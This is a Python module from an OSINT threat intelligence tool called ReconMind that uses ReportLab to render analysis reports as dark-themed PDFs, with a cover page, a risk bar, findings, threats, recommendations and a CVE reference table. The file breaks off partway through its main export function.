"""
╔══════════════════════════════════════════════════════════════════╗
║          ReconMind — AI-Powered OSINT Intelligence Engine        ║
║                        pdf_export.py                             ║
║     Professional dark-theme PDF threat intelligence exporter     ║
╚══════════════════════════════════════════════════════════════════╝

This module accepts the structured report dictionary produced by
groq_analysis.py and renders it as a polished, dark-theme PDF
document that matches the aesthetic of professional cybersecurity
threat intelligence reports.

Two public functions are provided:
  • export_pdf()         – full multi-page report
  • export_pdf_summary() – compact single-page summary

Author  : ReconMind Project
Module  : pdf_export.py
Requires: reportlab, colorama
"""

# ──────────────────────────────────────────────────────────────────
# Standard library
# ──────────────────────────────────────────────────────────────────
import os
import re
import sys
import textwrap
from datetime import datetime

# ──────────────────────────────────────────────────────────────────
# ReportLab imports
# ──────────────────────────────────────────────────────────────────
try:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.units import mm, cm
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import Color, HexColor
    from reportlab.platypus import (
        SimpleDocTemplate, Paragraph, Spacer, PageBreak,
        Table, TableStyle, HRFlowable, KeepTogether
    )
    from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
    from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT
    from reportlab.platypus.flowables import Flowable
except ImportError:
    print("[FATAL] reportlab not installed. Run: pip install reportlab")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────
# Colorama for terminal status messages
# ──────────────────────────────────────────────────────────────────
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    print("[FATAL] colorama not installed. Run: pip install colorama")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════
#  COLOUR PALETTE  (all as ReportLab Color objects)
# ══════════════════════════════════════════════════════════════════

# Page / structural colours
DARK_BG      = Color(0.07, 0.07, 0.15)       # Very dark navy — page background
DARK_PANEL   = Color(0.10, 0.10, 0.22)       # Slightly lighter panel for cards
DARK_BORDER  = Color(0.18, 0.18, 0.35)       # Subtle border lines

# Typography colours
WHITE        = Color(1.0,  1.0,  1.0)        # Primary body text
LIGHT_GRAY   = Color(0.78, 0.78, 0.88)       # Secondary / metadata text
GRAY         = Color(0.50, 0.50, 0.60)       # Muted labels and captions

# Accent colours
CYAN         = Color(0.0,  0.85, 1.0)        # Section headers, titles
CYAN_DIM     = Color(0.0,  0.55, 0.70)       # Divider lines

# Risk / severity colours
GREEN        = Color(0.20, 0.90, 0.40)       # LOW risk / recommendations
ORANGE       = Color(1.0,  0.60, 0.00)       # MEDIUM risk
RED          = Color(0.95, 0.20, 0.20)       # HIGH risk / threats
RED_BRIGHT   = Color(1.0,  0.10, 0.10)       # CRITICAL risk
YELLOW       = Color(1.0,  0.85, 0.00)       # Findings / warnings
AMBER        = Color(1.0,  0.65, 0.10)       # TLP:AMBER badge

# Table alternating row colours
TABLE_ROW_A  = Color(0.09, 0.09, 0.20)
TABLE_ROW_B  = Color(0.12, 0.12, 0.26)
TABLE_HEADER = Color(0.0,  0.55, 0.70)

# Risk colour lookup by level string
RISK_COLOUR_MAP = {
    "LOW":      GREEN,
    "MEDIUM":   ORANGE,
    "HIGH":     RED,
    "CRITICAL": RED_BRIGHT,
    "UNKNOWN":  GRAY,
}


# ══════════════════════════════════════════════════════════════════
#  PAGE GEOMETRY
# ══════════════════════════════════════════════════════════════════

PAGE_W, PAGE_H = A4           # 595.28 × 841.89 points
MARGIN_LEFT    = 20 * mm
MARGIN_RIGHT   = 20 * mm
MARGIN_TOP     = 20 * mm
MARGIN_BOTTOM  = 20 * mm
CONTENT_W      = PAGE_W - MARGIN_LEFT - MARGIN_RIGHT  # usable width


# ══════════════════════════════════════════════════════════════════
#  TERMINAL STATUS HELPERS
# ══════════════════════════════════════════════════════════════════

def _info(msg):  print(f"{Fore.CYAN}[*] {msg}{Style.RESET_ALL}")
def _ok(msg):    print(f"{Fore.GREEN}[✓] {msg}{Style.RESET_ALL}")
def _warn(msg):  print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")
def _err(msg):   print(f"{Fore.RED}[✗] {msg}{Style.RESET_ALL}")


# ══════════════════════════════════════════════════════════════════
#  UTILITY HELPERS
# ══════════════════════════════════════════════════════════════════

def _safe(value, fallback="N/A"):
    """Return value if truthy, otherwise fallback string."""
    return value if value else fallback


def _strip_markdown(text: str) -> str:
    """
    Remove common Markdown syntax so text renders cleanly in the PDF.
    Preserves line breaks, list markers, and general structure.
    """
    if not text:
        return ""
    text = re.sub(r"\*{1,3}(.+?)\*{1,3}", r"\1", text, flags=re.DOTALL)  # bold/italic
    text = re.sub(r"`{1,3}(.+?)`{1,3}", r"\1", text, flags=re.DOTALL)    # code spans
    text = re.sub(r"^#{1,6}\s*", "", text, flags=re.MULTILINE)            # headings
    text = re.sub(r"^\s*[-─═━]{3,}\s*$", "", text, flags=re.MULTILINE)   # horizontal rules
    text = re.sub(r"!\[.*?\]\(.*?\)", "", text)                            # images
    text = re.sub(r"\[([^\]]+)\]\([^\)]+\)", r"\1", text)                 # links → text
    return text.strip()


def _xml_escape(text: str) -> str:
    """Escape characters that break ReportLab's XML paragraph parser."""
    if not text:
        return ""
    text = str(text)
    text = text.replace("&", "&amp;")
    text = text.replace("<", "&lt;")
    text = text.replace(">", "&gt;")
    return text


def _ensure_dir(path: str) -> None:
    """Create directory (and parents) if it does not exist."""
    os.makedirs(path, exist_ok=True)


def _build_filename(target: str, suffix: str, output_dir: str) -> str:
    """
    Construct the output PDF path.
    Sanitises the target string so it is safe as a filename component.
    """
    safe_target = re.sub(r"[^\w.\-]", "_", str(target))
    date_str    = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename    = f"reconmind_{suffix}_{safe_target}_{date_str}.pdf"
    return os.path.join(output_dir, filename)


def _risk_colour(level: str) -> Color:
    """Return the ReportLab Color for a given risk level string."""
    return RISK_COLOUR_MAP.get(str(level).upper(), GRAY)


def _extract_cves(text: str) -> list:
    """Pull all CVE identifiers from any string."""
    if not text:
        return []
    return list(set(re.findall(r"CVE-\d{4}-\d+", str(text), re.IGNORECASE)))


# ══════════════════════════════════════════════════════════════════
#  CUSTOM FLOWABLES
# ══════════════════════════════════════════════════════════════════

class ColoredDivider(Flowable):
    """
    A full-width horizontal rule rendered as a thin coloured rectangle.
    Used between sections for visual separation.
    """
    def __init__(self, colour=CYAN_DIM, thickness=1, top_pad=4, bottom_pad=4):
        super().__init__()
        self.colour     = colour
        self.thickness  = thickness
        self.top_pad    = top_pad
        self.bottom_pad = bottom_pad
        self.width      = CONTENT_W
        self.height     = thickness + top_pad + bottom_pad

    def draw(self):
        self.canv.setFillColor(self.colour)
        self.canv.rect(
            0, self.bottom_pad,
            CONTENT_W, self.thickness,
            stroke=0, fill=1
        )


class RiskBar(Flowable):
    """
    A visual risk score progress bar drawn as two stacked rectangles:
      • Background (dark, full width)
      • Filled portion (risk colour, proportional to score)
    Followed by a text label showing LEVEL  score/100.
    """
    BAR_H    = 14          # bar rectangle height in points
    BAR_W    = 160         # total bar width in points
    LABEL_X  = 170         # x-position of the text label

    def __init__(self, score: int, level: str):
        super().__init__()
        self.score  = max(0, min(100, int(score)))
        self.level  = str(level).upper()
        self.colour = _risk_colour(self.level)
        self.width  = CONTENT_W
        self.height = self.BAR_H + 4

    def draw(self):
        c = self.canv
        y = 2  # baseline with small padding

        # ── Background track ────────────────────────────────────
        c.setFillColor(DARK_BORDER)
        c.roundRect(0, y, self.BAR_W, self.BAR_H, 3, stroke=0, fill=1)

        # ── Filled portion ───────────────────────────────────────
        filled_w = int((self.score / 100) * self.BAR_W)
        if filled_w > 0:
            c.setFillColor(self.colour)
            c.roundRect(0, y, filled_w, self.BAR_H, 3, stroke=0, fill=1)
        elif self.score == 0 and self.level == "LOW":
            c.setFillColor(GREEN)
            c.roundRect(0, y, 6, self.BAR_H, 3, stroke=0, fill=1)

        # ── Tick marks at 25/50/75 % ─────────────────────────────
        c.setFillColor(DARK_BG)
        for pct in (25, 50, 75):
            x = int((pct / 100) * self.BAR_W)
            c.rect(x, y, 1, self.BAR_H, stroke=0, fill=1)

        # ── Text label: LEVEL  score/100 ─────────────────────────
        c.setFillColor(self.colour)
        c.setFont("Helvetica-Bold", 11)
        c.drawString(self.LABEL_X, y + 2, f"{self.level}")

        c.setFillColor(WHITE)
        c.setFont("Helvetica", 10)
        c.drawString(self.LABEL_X + 70, y + 2, f"{self.score}/100")


class BulletItem(Flowable):
    """
    A single list item with a small coloured square bullet on the left
    and word-wrapped text on the right.

    Used for findings, threats, and recommendations throughout the report.
    """
    BULLET_SIZE = 6      # pt side length of the coloured square
    BULLET_X    = 0
    TEXT_X      = 14     # indent after bullet
    LINE_H      = 14     # line height for wrapped text
    MAX_CHARS   = 85     # character wrap width

    def __init__(self, text: str, colour=CYAN, prefix: str = ""):
        super().__init__()
        self.text    = _strip_markdown(str(text))
        self.colour  = colour
        self.prefix  = prefix  # e.g. "[01]" or "⚠"
        # Pre-wrap text to calculate height
        self._lines  = textwrap.wrap(self.text, width=self.MAX_CHARS)
        if not self._lines:
            self._lines = [""]
        self.width   = CONTENT_W
        self.height  = max(len(self._lines), 1) * self.LINE_H + 4

    def draw(self):
        c    = self.canv
        top  = self.height - self.LINE_H + 2

        # ── Coloured square bullet ───────────────────────────────
        c.setFillColor(self.colour)
        c.rect(
            self.BULLET_X,
            top - self.BULLET_SIZE + self.LINE_H - 8,
            self.BULLET_SIZE, self.BULLET_SIZE,
            stroke=0, fill=1
        )

        # ── Optional prefix label ────────────────────────────────
        if self.prefix:
            c.setFillColor(self.colour)
            c.setFont("Helvetica-Bold", 8)
            c.drawString(self.TEXT_X, top - 1, self.prefix)
            text_x = self.TEXT_X + 32
        else:
            text_x = self.TEXT_X

        # ── Wrapped text lines ───────────────────────────────────
        c.setFillColor(WHITE)
        c.setFont("Helvetica", 9)
        for i, line in enumerate(self._lines):
            y = top - (i * self.LINE_H)
            c.drawString(text_x, y, line)


# ══════════════════════════════════════════════════════════════════
#  PAGE CANVAS CALLBACK — footer / header on every page
# ══════════════════════════════════════════════════════════════════

class _PageDecor:
    """
    Callable passed to SimpleDocTemplate.build() as onFirstPage /
    onLaterPages.  Paints the dark background, thin top accent line,
    and the footer bar on every page.
    """

    def __init__(self, total_pages_ref: list):
        # total_pages_ref is a mutable list so we can back-fill the
        # total page count after the document is built.
        self._total = total_pages_ref

    def _background(self, c):
        """Fill the entire page with the dark navy background."""
        c.setFillColor(DARK_BG)
        c.rect(0, 0, PAGE_W, PAGE_H, stroke=0, fill=1)

    def _top_accent(self, c):
        """Draw a 3 pt cyan accent line at the very top of the page."""
        c.setFillColor(CYAN)
        c.rect(0, PAGE_H - 3, PAGE_W, 3, stroke=0, fill=1)

    def _footer(self, c, page_num):
        """
        Draw the footer bar with:
          ReconMind AI Engine | TLP:AMBER | CONFIDENTIAL | Page X of Y
        """
        footer_y = MARGIN_BOTTOM - 10
        bar_h    = 18

        # Footer background strip
        c.setFillColor(DARK_PANEL)
        c.rect(0, footer_y - 4, PAGE_W, bar_h, stroke=0, fill=1)

        # Left: branding
        c.setFillColor(CYAN)
        c.setFont("Helvetica-Bold", 7)
        c.drawString(MARGIN_LEFT, footer_y + 3, "ReconMind AI Engine")

        # Centre: classification badges
        c.setFillColor(AMBER)
        c.setFont("Helvetica-Bold", 7)
        centre_x = PAGE_W / 2
        c.drawCentredString(centre_x, footer_y + 3, "TLP:AMBER  |  CONFIDENTIAL")

        # Right: page number
        total = self._total[0] if self._total[0] else "?"
        c.setFillColor(LIGHT_GRAY)
        c.setFont("Helvetica", 7)
        c.drawRightString(
            PAGE_W - MARGIN_RIGHT,
            footer_y + 3,
            f"Page {page_num} of {total}"
        )

        # Footer top border
        c.setFillColor(CYAN_DIM)
        c.rect(0, footer_y + bar_h - 5, PAGE_W, 1, stroke=0, fill=1)

    def __call__(self, c, doc):
        c.saveState()
        self._background(c)
        self._top_accent(c)
        self._footer(c, doc.page)
        c.restoreState()


# ══════════════════════════════════════════════════════════════════
#  STYLE FACTORY
# ══════════════════════════════════════════════════════════════════

def _make_styles() -> dict:
    """
    Build and return a dictionary of all ParagraphStyle objects used
    throughout the report.  Using named styles keeps the content-building
    functions clean and easy to tweak.
    """
    base = dict(
        fontName        = "Helvetica",
        textColor       = WHITE,
        backColor       = None,
        leading         = 14,
        spaceAfter      = 4,
        spaceBefore     = 0,
        leftIndent      = 0,
        rightIndent     = 0,
    )

    def _s(name, **overrides):
        kwargs = {**base, **overrides}
        return ParagraphStyle(name, **kwargs)

    return {
        # ── Body text ────────────────────────────────────────────
        "body"          : _s("body",         fontSize=9,  leading=14),
        "body_small"    : _s("body_small",   fontSize=8,  leading=12, textColor=LIGHT_GRAY),
        "body_mono"     : _s("body_mono",    fontSize=8,  leading=12, fontName="Courier"),

        # ── Headings ─────────────────────────────────────────────
        "section_hdr"   : _s("section_hdr",  fontSize=13, leading=18,
                              fontName="Helvetica-Bold", textColor=CYAN,
                              spaceBefore=10, spaceAfter=2),
        "sub_hdr"       : _s("sub_hdr",      fontSize=10, leading=14,
                              fontName="Helvetica-Bold", textColor=CYAN,
                              spaceBefore=6, spaceAfter=2),

        # ── Cover page ───────────────────────────────────────────
        "cover_title"   : _s("cover_title",  fontSize=36, leading=42,
                              fontName="Helvetica-Bold", textColor=CYAN,
                              alignment=TA_CENTER),
        "cover_sub"     : _s("cover_sub",    fontSize=13, leading=18,
                              textColor=LIGHT_GRAY, alignment=TA_CENTER),
        "cover_meta"    : _s("cover_meta",   fontSize=10, leading=14,
                              textColor=WHITE, alignment=TA_CENTER),
        "cover_label"   : _s("cover_label",  fontSize=8,  leading=12,
                              textColor=GRAY,  alignment=TA_CENTER),
        "tlp_badge"     : _s("tlp_badge",    fontSize=9,  leading=12,
                              fontName="Helvetica-Bold", textColor=AMBER,
                              alignment=TA_CENTER),

        # ── Lists ────────────────────────────────────────────────
        "finding"       : _s("finding",      fontSize=9,  leading=13,
                              textColor=YELLOW, leftIndent=14),
        "threat"        : _s("threat",       fontSize=9,  leading=13,
                              textColor=RED,    leftIndent=14),
        "rec"           : _s("rec",          fontSize=9,  leading=13,
                              textColor=GREEN,  leftIndent=14),

        # ── Full report body ─────────────────────────────────────
        "report_h1"     : _s("report_h1",    fontSize=12, leading=16,
                              fontName="Helvetica-Bold", textColor=CYAN,
                              spaceBefore=12, spaceAfter=3),
        "report_h2"     : _s("report_h2",    fontSize=10, leading=14,
                              fontName="Helvetica-Bold", textColor=CYAN,
                              spaceBefore=8,  spaceAfter=2),
        "report_body"   : _s("report_body",  fontSize=8.5, leading=13,
                              textColor=LIGHT_GRAY),
        "report_list"   : _s("report_list",  fontSize=8.5, leading=13,
                              textColor=YELLOW, leftIndent=12),
        "report_cve"    : _s("report_cve",   fontSize=8.5, leading=13,
                              textColor=RED, fontName="Courier"),
    }


# ══════════════════════════════════════════════════════════════════
#  COVER PAGE BUILDER
# ══════════════════════════════════════════════════════════════════

def _build_cover(report: dict, styles: dict, is_summary: bool = False) -> list:
    """
    Build the story elements for the cover page.

    Layout (top → bottom):
      • Outer border rectangle (drawn via a custom Flowable)
      • Large RECONMIND title
      • Subtitle
      • Horizontal divider
      • Target metadata box
      • Risk bar
      • TLP / date / classification
      • Page break

    Args:
        report    : report dict
        styles    : dict from _make_styles()
        is_summary: if True, adds "(SUMMARY)" to the subtitle

    Returns:
        List of Flowable objects for the story.
    """
    story   = []
    target  = _safe(report.get("target"))
    score   = int(report.get("risk_score", 0))
    level   = str(report.get("risk_level", "UNKNOWN")).upper()
    rc      = _risk_colour(level)
    date_s  = datetime.now().strftime("%B %d, %Y  %H:%M UTC")
    sub_tag = "  (EXECUTIVE SUMMARY)" if is_summary else ""

    # ── Top spacer to push content down from accent line ─────────
    story.append(Spacer(1, 30))

    # ── Outer border box ─────────────────────────────────────────
    # Implemented as a zero-height Flowable that just draws a rect
    class _CoverBorder(Flowable):
        def __init__(self):
            super().__init__()
            self.width  = CONTENT_W
            self.height = 0   # no height consumed — drawn relative to position

        def draw(self):
            # Draw a rounded rectangle that spans most of the page height
            # We offset upward from the current draw position
            c = self.canv
            c.setStrokeColor(CYAN_DIM)
            c.setLineWidth(1.5)
            c.roundRect(
                -MARGIN_LEFT + 10, -PAGE_H + MARGIN_BOTTOM + 30 + 40,
                PAGE_W - 20, PAGE_H - MARGIN_BOTTOM - 80,
                8, stroke=1, fill=0
            )
            # Inner accent line at top of box
            c.setStrokeColor(CYAN)
            c.setLineWidth(3)
            c.line(
                -MARGIN_LEFT + 10, PAGE_H - MARGIN_TOP - 38 - 30,
                PAGE_W - 10,       PAGE_H - MARGIN_TOP - 38 - 30,
            )

    story.append(_CoverBorder())
    story.append(Spacer(1, 12))

    # ── RECONMIND title ──────────────────────────────────────────
    story.append(Paragraph("RECONMIND", styles["cover_title"]))
    story.append(Spacer(1, 6))

    # ── Subtitle ─────────────────────────────────────────────────
    story.append(Paragraph(
        f"AI-Powered OSINT Threat Intelligence Report{sub_tag}",
        styles["cover_sub"]
    ))
    story.append(Spacer(1, 8))

    # ── Cyan divider ─────────────────────────────────────────────
    story.append(ColoredDivider(colour=CYAN, thickness=2, top_pad=2, bottom_pad=2))
    story.append(Spacer(1, 20))

    # ── Target info panel ────────────────────────────────────────
    # Rendered as a 1-row, 2-column table acting as a styled card
    meta_rows = [
        ["TARGET", _xml_escape(target)],
        ["SCAN DATE", _xml_escape(date_s)],
        ["REPORT TYPE", "Threat Intelligence Assessment"],
        ["CLASSIFICATION", "TLP:AMBER — CONFIDENTIAL" if score > 0 else "TLP:CLEAR — CLEAN FOOTPRINT"],
    ]

    label_style = ParagraphStyle(
        "meta_lbl", fontName="Helvetica-Bold", fontSize=8,
        textColor=GRAY, leading=12
    )
    value_style = ParagraphStyle(
        "meta_val", fontName="Helvetica", fontSize=10,
        textColor=WHITE, leading=14
    )

    tdata = [
        [Paragraph(r[0], label_style), Paragraph(r[1], value_style)]
        for r in meta_rows
    ]

    meta_table = Table(tdata, colWidths=[55 * mm, CONTENT_W - 55 * mm])
    meta_table.setStyle(TableStyle([
        ("BACKGROUND",  (0, 0), (-1, -1), DARK_PANEL),
        ("BACKGROUND",  (0, 0), (0, -1),  Color(0.08, 0.08, 0.18)),
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [TABLE_ROW_A, TABLE_ROW_B]),
        ("BOX",         (0, 0), (-1, -1), 1, DARK_BORDER),
        ("INNERGRID",   (0, 0), (-1, -1), 0.5, DARK_BORDER),
        ("TOPPADDING",  (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 10),
        ("RIGHTPADDING",(0, 0), (-1, -1), 10),
        ("VALIGN",      (0, 0), (-1, -1), "MIDDLE"),
    ]))
    story.append(meta_table)
    story.append(Spacer(1, 20))

    # ── Risk score label + bar ───────────────────────────────────
    story.append(Paragraph("RISK ASSESSMENT", styles["cover_label"]))
    story.append(Spacer(1, 6))

    # Centre the risk bar by wrapping it in a 1-cell table
    bar_table = Table([[RiskBar(score, level)]], colWidths=[CONTENT_W])
    bar_table.setStyle(TableStyle([
        ("ALIGN",       (0, 0), (-1, -1), "CENTER"),
        ("TOPPADDING",  (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("LEFTPADDING", (0, 0), (-1, -1), 0),
        ("RIGHTPADDING",(0, 0), (-1, -1), 0),
    ]))
    story.append(bar_table)
    story.append(Spacer(1, 24))

    # ── Divider ───────────────────────────────────────────────────
    story.append(ColoredDivider(colour=CYAN_DIM))
    story.append(Spacer(1, 16))

    # ── Prepared-by line ─────────────────────────────────────────
    story.append(Paragraph("Prepared by  ReconMind AI Engine", styles["cover_label"]))
    story.append(Spacer(1, 4))
    story.append(Paragraph(
        '<font color="#FF9900"><b>TLP:AMBER</b></font>  '
        '— Distribution limited to the requesting organisation.',
        ParagraphStyle(
            "tlp_note", fontName="Helvetica", fontSize=8,
            textColor=GRAY, alignment=TA_CENTER, leading=12
        )
    ))

    # ── Page break after cover ────────────────────────────────────
    story.append(PageBreak())
    return story


# ══════════════════════════════════════════════════════════════════
#  SECTION BUILDERS  (each returns a list of Flowables)
# ══════════════════════════════════════════════════════════════════

def _section_title(title: str, styles: dict) -> list:
    """Return a section header + coloured divider as a KeepTogether block."""
    return [
        KeepTogether([
            Paragraph(_xml_escape(title), styles["section_hdr"]),
            ColoredDivider(colour=CYAN, thickness=1, top_pad=1, bottom_pad=6),
        ])
    ]


def _build_summary_section(report: dict, styles: dict) -> list:
    """Build the Executive Summary section."""
    story   = []
    summary = _safe(report.get("summary"), "No summary available.")
    cleaned = _strip_markdown(summary)

    story += _section_title("EXECUTIVE SUMMARY", styles)

    for para in cleaned.split("\n\n"):
        para = para.strip()
        if para:
            story.append(Paragraph(_xml_escape(para), styles["body"]))
            story.append(Spacer(1, 6))

    story.append(Spacer(1, 10))
    return story


def _build_findings_section(report: dict, styles: dict) -> list:
    """
    Build the Key Findings section.
    Each finding gets a yellow square bullet and a [NN] index prefix.
    """
    story    = []
    findings = report.get("findings") or []

    story += _section_title("KEY FINDINGS", styles)

    if not findings:
        story.append(Paragraph("No findings recorded.", styles["body_small"]))
    else:
        for i, item in enumerate(findings, 1):
            story.append(BulletItem(
                text   = item,
                colour = YELLOW,
                prefix = f"[{i:02d}]"
            ))
            story.append(Spacer(1, 3))

    story.append(Spacer(1, 10))
    return story


def _build_threats_section(report: dict, styles: dict) -> list:
    """
    Build the Threats Identified section.
    Each threat gets a red square bullet with a ⚠ prefix.
    """
    story   = []
    threats = report.get("threats") or []
    level   = str(report.get("risk_level", "HIGH")).upper()
    rc      = _risk_colour(level)

    story += _section_title("THREATS IDENTIFIED", styles)

    if not threats:
        story.append(Paragraph(
            "No active threats identified at this time.", styles["body_small"]
        ))
    else:
        for item in threats:
            story.append(BulletItem(text=item, colour=rc, prefix="[THREAT]"))
            story.append(Spacer(1, 3))

    story.append(Spacer(1, 10))
    return story


def _build_recommendations_section(report: dict, styles: dict) -> list:
    """
    Build the Recommendations section.
    Each item gets a green square bullet and a [NN] ✓ prefix.
    """
    story = []
    recs  = report.get("recommendations") or []

    story += _section_title("RECOMMENDATIONS", styles)

    if not recs:
        story.append(Paragraph("No recommendations available.", styles["body_small"]))
    else:
        for i, item in enumerate(recs, 1):
            story.append(BulletItem(
                text   = item,
                colour = GREEN,
                prefix = f"[{i:02d}] ok"
            ))
            story.append(Spacer(1, 3))

    story.append(Spacer(1, 10))
    return story


def _build_cve_table(report: dict, styles: dict) -> list:
    """
    If any CVE identifiers are found anywhere in the report data,
    render a simple vulnerability assessment table listing them.
    Skipped entirely if no CVEs are detected.
    """
    story = []

    # Gather CVEs from all text fields
    all_text = " ".join([
        str(report.get("summary",         "")),
        str(report.get("full_report",     "")),
        " ".join(report.get("findings",        [])),
        " ".join(report.get("threats",         [])),
        " ".join(report.get("recommendations", [])),
    ])
    cves = _extract_cves(all_text)

    if not cves:
        return story

    story += _section_title("VULNERABILITY REFERENCE", styles)

    hdr_style = ParagraphStyle(
        "th", fontName="Helvetica-Bold", fontSize=8,
        textColor=WHITE, leading=11
    )
    cell_style = ParagraphStyle(
        "td", fontName="Courier", fontSize=8,
        textColor=RED, leading=11
    )
    note_style = ParagraphStyle(
        "td_note", fontName="Helvetica", fontSize=8,
        textColor=LIGHT_GRAY, leading=11
    )

    header = [
        Paragraph("CVE Identifier",   hdr_style),
        Paragraph("Status",           hdr_style),
        Paragraph("Action Required",  hdr_style),
    ]
    rows = [header]
    for cve in sorted(cves):
        rows.append([
            Paragraph(cve,                           cell_style),
            Paragraph("Detected",                    note_style),
            Paragraph("Verify patch status & apply vendor advisory", note_style),
        ])

    col_w = [CONTENT_W * 0.30, CONTENT_W * 0.20, CONTENT_W * 0.50]
    tbl = Table(rows, colWidths=col_w)
    tbl.setStyle(TableStyle([
        # Header row
        ("BACKGROUND",    (0, 0), (-1,  0),  TABLE_HEADER),
        ("FONTNAME",      (0, 0), (-1,  0),  "Helvetica-Bold"),
        # Alternating body rows
        ("ROWBACKGROUNDS",(0, 1), (-1, -1),  [TABLE_ROW_A, TABLE_ROW_B]),
        # Borders
        ("BOX",           (0, 0), (-1, -1),  1,   DARK_BORDER),
        ("INNERGRID",     (0, 0), (-1, -1),  0.5, DARK_BORDER),
        # Padding
        ("TOPPADDING",    (0, 0), (-1, -1),  5),
        ("BOTTOMPADDING", (0, 0), (-1, -1),  5),
        ("LEFTPADDING",   (0, 0), (-1, -1),  8),
        ("RIGHTPADDING",  (0, 0), (-1, -1),  8),
        ("VALIGN",        (0, 0), (-1, -1),  "MIDDLE"),
    ]))

    story.append(tbl)
    story.append(Spacer(1, 12))
    return story


def _build_full_report_section(report: dict, styles: dict) -> list:
    """
    Build the Full Intelligence Report section.

    Renders the AI-generated Markdown report with smart line-type
    detection to apply appropriate styles:
      • Level-1 headings (# …)        → report_h1
      • Level-2 headings (## …)       → report_h2
      • List items (- / * / 1.)       → report_list
      • CVE references                → report_cve
      • Everything else               → report_body
    """
    story       = []
    full_report = str(report.get("full_report", ""))

    if not full_report.strip():
        return story

    story += _section_title("FULL INTELLIGENCE REPORT", styles)
    story.append(Spacer(1, 4))

    for raw_line in full_report.splitlines():
        line = raw_line.rstrip()

        # ── Blank lines ──────────────────────────────────────────
        if not line.strip():
            story.append(Spacer(1, 4))
            continue

        stripped = line.strip()

        # ── Markdown horizontal rules → coloured divider ─────────
        if re.match(r"^[-─═━\*]{3,}\s*$", stripped):
            story.append(ColoredDivider(colour=DARK_BORDER, thickness=1))
            continue

        # ── Level-1 heading (# text) ─────────────────────────────
        if re.match(r"^#\s+", stripped):
            heading = re.sub(r"^#+\s*", "", stripped)
            story.append(Paragraph(_xml_escape(heading), styles["report_h1"]))
            story.append(ColoredDivider(colour=CYAN_DIM, thickness=1,
                                        top_pad=2, bottom_pad=4))
            continue

        # ── Level-2 heading (## text) ────────────────────────────
        if re.match(r"^#{2,}\s+", stripped):
            heading = re.sub(r"^#+\s*", "", stripped)
            story.append(Paragraph(_xml_escape(heading), styles["report_h2"]))
            continue

        # ── List items ───────────────────────────────────────────
        list_match = re.match(r"^\s*([-*•]|\d+[.)]) (.+)", line)
        if list_match:
            text = _xml_escape(_strip_markdown(list_match.group(2)))
            story.append(Paragraph(f"•  {text}", styles["report_list"]))
            continue

        # ── Table rows (| … |) → render as plain text ───────────
        if stripped.startswith("|"):
            # Strip markdown table markup into plain text
            cells = [c.strip() for c in stripped.split("|") if c.strip()]
            plain = "   ".join(cells)
            story.append(Paragraph(
                _xml_escape(_strip_markdown(plain)),
                styles["body_mono"]
            ))
            continue

        # ── Lines containing CVEs → highlight style ──────────────
        if re.search(r"CVE-\d{4}-\d+", stripped, re.IGNORECASE):
            story.append(Paragraph(
                _xml_escape(_strip_markdown(stripped)),
                styles["report_cve"]
            ))
            continue

        # ── Default body text ────────────────────────────────────
        story.append(Paragraph(
            _xml_escape(_strip_markdown(stripped)),
            styles["report_body"]
        ))

    story.append(Spacer(1, 12))
    return story


# ══════════════════════════════════════════════════════════════════
#  ERROR NOTICE  (shown when report.error is set)
# ══════════════════════════════════════════════════════════════════

def _build_error_notice(report: dict, styles: dict) -> list:
    """If the report contains an error, build a prominent red notice."""
    error = report.get("error")
    if not error:
        return []

    story = []
    err_style = ParagraphStyle(
        "err", fontName="Helvetica-Bold", fontSize=10,
        textColor=RED, leading=14, spaceBefore=6, spaceAfter=6
    )
    story.append(ColoredDivider(colour=RED, thickness=2))
    story.append(Paragraph(f"ANALYSIS ERROR:  {_xml_escape(str(error))}", err_style))
    story.append(ColoredDivider(colour=RED, thickness=2))
    story.append(Spacer(1, 10))
    return story


# ══════════════════════════════════════════════════════════════════
#  DOCUMENT ASSEMBLY HELPERS
# ══════════════════════════════════════════════════════════════════

def _build_doc(path: str, total_pages_ref: list) -> SimpleDocTemplate:
    """
    Create and return a configured SimpleDocTemplate for the given path.
    The footer callback is injected via onFirstPage / onLaterPages.
    """
    decor = _PageDecor(total_pages_ref)

    doc = SimpleDocTemplate(
        path,
        pagesize      = A4,
        leftMargin    = MARGIN_LEFT,
        rightMargin   = MARGIN_RIGHT,
        topMargin     = MARGIN_TOP + 10,
        bottomMargin  = MARGIN_BOTTOM + 10,
        title         = "ReconMind Threat Intelligence Report",
        author        = "ReconMind AI Engine",
        subject       = "OSINT Threat Analysis",
        creator       = "ReconMind",
    )

    # Attach page decorator to both first and subsequent pages
    doc._onFirstPage  = decor
    doc._onLaterPages = decor
    return doc


def _get_page_count(path: str) -> int:
    """
    Quick post-build page count using pypdf if available,
    falling back to a reportlab re-read.
    Returns 0 on failure.
    """
    try:
        from pypdf import PdfReader
        return len(PdfReader(path).pages)
    except Exception:
        pass
    try:
        from reportlab.pdfgen import canvas as rl_canvas
        # Not straightforward — just return 0; footer will show "?"
    except Exception:
        pass
    return 0


# ══════════════════════════════════════════════════════════════════
#  PUBLIC API
# ══════════════════════════════════════════════════════════════════

def export_pdf(report: dict, output_dir: str = "output/reports") -> str:
    """
    Generate a full multi-page threat intelligence PDF report.

    Pages / sections produced:
      Page 1  — Cover (target info, risk bar, classification)
      Page 2+ — Executive Summary
              — Key Findings
              — Threats Identified
              — Recommendations
              — CVE Reference Table (if CVEs detected)
              — Full Intelligence Report

    Args:
        report    : dict from groq_analysis.analyze_target()
        output_dir: directory path where the PDF is saved

    Returns:
        Absolute path to the saved PDF file, or empty string on failure.
    """
    _info("=" * 55)
    _info("ReconMind PDF Exporter — Full Report")
    _info("=" * 55)

    # ── Validate input ────────────────────────────────────────────
    if not isinstance(report, dict):
        _err(f"export_pdf() expects a dict, received {type(report)}")
        return ""

